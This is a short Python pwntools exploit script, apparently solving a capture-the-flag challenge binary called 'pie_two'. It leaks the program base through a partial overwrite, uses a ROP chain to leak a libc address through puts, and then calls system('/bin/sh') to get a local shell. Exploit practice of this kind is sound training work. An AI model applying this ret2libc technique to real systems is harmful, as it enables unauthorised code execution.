from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./pie_two')
elf = ELF('./pie_two')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gdb.attach(p,'b *$rebase(0x1236)')
payload = 0x10*b'a' + p8(0x61)
p.sendafter(b'>>\n',payload)
p.recvuntil(0x10*b'a')
pro_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x1261
# ROPgadget --binary ./pie_two --only "pop|ret" | grep "rdi"
rdi = pro_base + 0x12d3
ret = pro_base + 0x101a
puts_got = pro_base + elf.got['puts']
puts_sym = pro_base + elf.sym['puts']
vuln = pro_base + elf.sym['vuln']

payload = 0x10*b'a' + p64(rdi) + p64(puts_got) + p64(puts_sym) + p64(vuln)
p.sendafter(b'>>\n',payload)
puts_address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = puts_address - libc.sym['puts']
p.success('libc_base -- >> 0x%x' % libc_base)

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = 0x10*b'a' + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)
p.sendafter(b'>>\n',payload)

p.interactive()
